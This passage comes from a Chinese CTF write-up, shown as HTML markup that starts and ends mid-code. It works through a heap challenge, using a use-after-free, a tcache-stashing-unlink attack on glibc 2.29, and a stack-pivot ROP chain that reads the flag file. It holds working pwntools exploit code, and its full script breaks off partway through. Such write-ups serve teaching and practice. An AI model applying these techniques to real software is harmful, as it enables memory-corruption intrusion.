class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> num <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// uaf</span></pre></td></tr></table></figure><p>存在 <code>uaf</code>  漏洞</p>\n<ul>\n<li>edit</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num_1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">--</span>num_1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 一次进入 edit 的机会</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input content: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>v2 <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> idx <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> idx <span class=\"token operator\">+</span> a1 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>read_overbuf</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-80h] BYREF</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>__int64 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>sys_malloc <span class=\"token operator\">+</span> <span class=\"token number\">0x800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x7F0000000000LL</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token operator\">||</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>sys_malloc <span class=\"token operator\">+</span> <span class=\"token number\">0x7F8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token operator\">||</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>sys_malloc <span class=\"token operator\">+</span> <span class=\"token number\">0x808</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 设置 sys_malloc+0x800 位置要大于 0x7F0000000000</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x90uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 栈溢出</span></pre></td></tr></table></figure><p>存在栈溢出</p>\n<blockquote>\n<p>2.26 之后，ptmalloc 引入 tcache 机制， <code>0x20</code> - <code>0x410</code>  大小的 free_chunk 都会先进入 tcache_bin 内，之后满 7 个之后会进入符合其大小的 bin 内。</p>\n<p>在这个程序代码内，使用了 calloc 函数去创建分配堆块</p>\n<ul>\n<li>calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</li>\n<li>不从 tcache 去相应大小的堆块</li>\n</ul>\n</blockquote>\n<p>这题的目的是修改 <code>sys_malloc + 0x800</code>  处，修改一个很大的数，从而拥有一个栈溢出的能力，因为栈溢出的长度太小，需要迁移。</p>\n<p>首先还是先填满 tachae 去泄露 libcbase 和 heapbase</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Sho<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>heapaddr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xd1c0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xb000</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Sho<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>libcaddr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heapaddr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcaddr'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>然后需要进行 <code>tcache-stashing-unlink-attack</code></p>\n<p>如何在本例实现此次攻击，需要结合 small 分配时的操作</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 获取 small bin 中倒数第二个 chunk 。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>bck <span class=\"token operator\">=</span> victim<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 检查 bck->fd 是不是 victim，防止伪造</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">__glibc_unlikely</span><span class=\"token punctuation\">(</span> bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> victim <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc(): smallbin double linked list corrupted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 设置 victim 对应的 inuse 位</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">set_inuse_bit_at_offset</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 在当前 tcache 没有满，smallbin 不空的时候，把相同大小的 chunk 相继取出。注意：这里没有双向链表完整性检查</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_count</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>       <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>tc_victim <span class=\"token operator\">=</span> <span class=\"token function\">last</span> <span class=\"token punctuation\">(</span>bin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> bin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tc_victim <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        bck <span class=\"token operator\">=</span> tc_victim<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">set_inuse_bit_at_offset</span> <span class=\"token punctuation\">(</span>tc_victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>av <span class=\"token operator\">!=</span> <span class=\"token operator\">&amp;</span>main_arena<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>          <span class=\"token function\">set_non_main_arena</span> <span class=\"token punctuation\">(</span>tc_victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">tcache_put</span> <span class=\"token punctuation\">(</span>tc_victim<span class=\"token punctuation\">,</span> tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>也就是说： <code>当smallbin中存在块，但是tcache未满时，如果从smallbin在取出一个块后未空，那么就会把这个对应大小的smallbin中的所有chunk全部转移到相应大小的tcache中，直到tcache满为止。</code></p>\n<ul>\n<li>\n<p>当 tcache_bin 内有 6 个 chunk 时，无法去完成一个任意地址分配的操作，但是可以把链头 chunk 的 BK 位置写上一个 main_arena</p>\n</li>\n<li>\n<p>若有 5 个块时，则可以去完成一个任意地址分配的操作</p>\n</li>\n</ul>\n<p>此题可以用 6 个 chunk 的场景</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tAdd<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'oooo'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tDel<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>先去申请 6 个 0xf0 的 chunk，并放入 0x100 的 tcache_bin 内</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 防止合併</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span>\t\t\t <span class=\"token comment\"># 置入 unsortedbin</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 切割 </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 置入 0x100 的 small bin</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 置入 0x100 的 small bin</span></pre></td></tr></table></figure><p>在 0x100 的 small_bin 放入两个 chunk</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heapaddr <span class=\"token operator\">-</span> <span class=\"token number\">0xb000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xe7e0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heapaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x250</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x800</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'oooo'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>uaf 写链头 chunk，完成 <code>tcache-stashing-unlink-attack</code> ，从而在目标地址写上 main_arean (…) 地址</p>\n<p>接下来 orw 写到一个 chunk 上，并用栈溢出迁移过去即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>lvr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000058373</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>rdi <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026542</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>rsi <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026f9e</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rdx <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000012bda6</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>writ_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> heapaddr <span class=\"token operator\">-</span> <span class=\"token number\">0xb000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xf630</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pay <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">b'./flag\\x00\\x00'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> writ_addr</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>pay<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>pay2 <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lvr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>meau<span class=\"token punctuation\">(</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'What do you want to say?'</span><span class=\"token punctuation\">,</span>pay2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp：</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc-2.29.so'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"node5.buuoj.cn:26125\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token 